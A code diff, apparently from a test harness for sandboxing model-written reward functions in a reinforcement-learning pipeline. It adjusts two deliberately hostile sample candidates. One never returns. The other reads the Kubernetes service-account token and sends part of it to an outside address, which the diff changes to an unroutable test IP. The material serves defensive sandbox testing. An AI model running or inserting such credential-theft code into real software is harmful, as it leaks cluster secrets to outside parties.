@@ -75,7 +75,8 @@ def compute_reward(obs, action, next_obs, terminated):
 # {{docs-fragment hostile}}
 # Model-written code is untrusted. These two stand in for the candidates that go wrong: one
 # never returns, and one tries to read the pod's credentials and call out to the network.
-# They run in generation 1 with everything else, and the sandbox stops both.
+# They run in generation 1 with everything else, and the sandbox stops both. The network call
+# goes to 192.0.2.1 (TEST-NET-1, never routed), so nothing leaves even if the sandbox failed.
 HOSTILE = {
     "never_returns": """\
 def compute_reward(obs, action, next_obs, terminated):
@@ -85,7 +86,7 @@ def compute_reward(obs, action, next_obs, terminated):
     "exfiltrates": """\
 import os, urllib.request
 token = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()
-urllib.request.urlopen("https://example.com/?t=" + token[:8], timeout=3)
+urllib.request.urlopen("http://192.0.2.1/?t=" + token[:8], timeout=3)
 def compute_reward(obs, action, next_obs, terminated):
     return 0.0, {}
 """,
